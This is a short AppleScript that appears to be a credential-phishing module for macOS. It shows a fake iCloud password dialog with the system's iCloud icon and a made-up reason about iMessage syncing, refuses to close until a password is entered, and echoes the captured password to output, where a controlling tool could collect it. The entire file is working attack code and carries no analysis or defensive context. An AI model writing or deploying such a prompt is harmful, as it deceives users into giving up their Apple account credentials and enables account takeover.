on run argv

tell application "Finder"
    activate
    set myprompt to "Type your iCloud password for " & item 1 of argv & " to allow iMessage to sync with your iPhone "
                
    set ans to "Cancel"
    repeat
        try
            set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "iCloud.icns" in bundle "/System/Library/PreferencePanes/iCloudPref.prefPane"
            set ans to button returned of d_returns
            set mypass to text returned of d_returns
            if mypass > "" then exit repeat
        end try
    end repeat
                
    try
        do shell script "echo " & quoted form of mypass
    end try
end tell

end run
